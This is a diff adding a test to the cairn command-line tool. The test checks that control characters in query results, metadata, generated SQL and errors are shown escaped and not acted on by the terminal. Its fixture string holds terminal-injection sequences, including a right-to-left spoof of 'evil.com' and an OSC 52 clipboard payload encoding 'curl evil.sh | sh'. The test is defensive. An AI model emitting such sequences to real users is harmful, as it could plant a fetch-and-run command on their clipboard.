@@ -167,3 +167,77 @@ def _cairn_on_path(home) -> str:
     exe.write_text(f"#!/bin/sh\nPYTHONPATH={SRC} exec {sys.executable} -m cairn_cli.main \"$@\"\n")
     exe.chmod(0o755)
     return str(bindir)
+
+
+# Escape sequences a terminal would act on: clear the screen, set the clipboard (OSC 52), retitle the window, a
+# one-byte CSI, and a right-to-left override that reorders what is shown.
+HOSTILE = "ok\x1b[2J\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07\x1b]0;pwned\x07\x9b31m‮moc.live"
+
+
+def _no_controls(text: str) -> None:
+    for c in ("\x1b", "\x07", "\x9b", "‮"):
+        assert c not in text, (c, text)
+
+
+def test_what_cairn_answers_is_shown_never_acted_on_by_the_terminal(home, monkeypatch, capsys):
+    """Table cells (query results), an asset's description and names (catalog metadata anyone with edit rights
+    writes), the assistant's SQL and explanation, and error messages that echo data reach the person's terminal
+    with their control characters shown escaped, not interpreted."""
+    import argparse
+    import io
+
+    from cairn_cli import commands, main as cli_main
+    from cairn_cli.output import Style, TableWriter, safe, table
+
+    assert safe("a\x1bb\nc\td") == "a\\x1bb\nc\td" and safe("a\nb\tc", lines=False) == "a b c"
+    assert safe("x‮y") == "x\\u202ey" and safe("Zürich 東京") == "Zürich 東京"
+    _no_controls(table(["c\x1b[31m"], [[HOSTILE], [{"k": HOSTILE}]], Style(io.StringIO())))
+    buf = io.StringIO()
+    w = TableWriter(buf, Style(buf))
+    w.start([{"name": "v"}])
+    w.write([[HOSTILE]] * 250)                       # past the sample: later rows are written line by line
+    w.write([[HOSTILE]])
+    w.finish()
+    _no_controls(buf.getvalue())
+    assert "\\x1b]52;c;" in buf.getvalue()           # still visible, as text
+
+    class FakeSession:
+        url = "https://cairn.example.com"
+
+        def __init__(self, answers):
+            self.answers = answers
+
+        def call(self, method, path, body=None, **kw):
+            return self.answers[path]
+
+        def request(self, method, path, **kw):
+            doc = self.answers[path]
+            return type("R", (), {"status_code": 200, "json": lambda self: doc})()
+
+        def close(self):
+            pass
+
+    asset = {"urn": f"urn:li:dataset:(urn:li:dataPlatform:trino,{HOSTILE},PROD)", "name": HOSTILE,
+             "platform": "trino", "description": f"Orders.\n{HOSTILE}",
+             "owners": [{"owner": f"urn:li:corpuser:{HOSTILE}"}], "terms": [], "tags": [f"urn:li:tag:{HOSTILE}"],
+             "domains": [], "columns": [{"name": HOSTILE, "type": "varchar", "terms": [], "description": HOSTILE}],
+             "lineage": {"upstream": [HOSTILE], "downstream": [HOSTILE]}}
+    answer = {"sql": f"SELECT 1 -- {HOSTILE}", "connection": "lakehouse", "dialect": "trino",
+              "explanation": HOSTILE, "ontology": {"findings": [{"message": HOSTILE}]},
+              "result": {"columns": ["a"], "rows": [[HOSTILE]], "masked_columns": [HOSTILE]}}
+    fake = FakeSession({"/v1/assets/describe": asset, "/data/ask": answer,
+                        "/v1/assets/search": {"results": [{"type": "DATASET", "name": HOSTILE, "urn": asset["urn"]}]}})
+    monkeypatch.setattr(commands.Session, "open", classmethod(lambda cls, *a, **k: fake))
+    a = argparse.Namespace(profile=None, output="table", no_color=False, quiet=False, asset="sales.orders",
+                           question=["why?"], dataset=None, no_run=False, limit=10, text=["orders"], type=None)
+    assert commands.cmd_show(a) == 0 and commands.cmd_ask(a) == 0 and commands.cmd_search(a) == 0
+    out = capsys.readouterr()
+    _no_controls(out.out + out.err)
+    assert "Orders." in out.out
+
+    def failing(_a):
+        raise CliError(f"the query failed: Cannot cast '{HOSTILE}' to integer")
+    rc = cli_main.dispatch(argparse.Namespace(fn=failing, profile=None, quiet=False, no_color=False))
+    err = capsys.readouterr().err
+    assert rc == ERROR and "Cannot cast" in err
+    _no_controls(err)
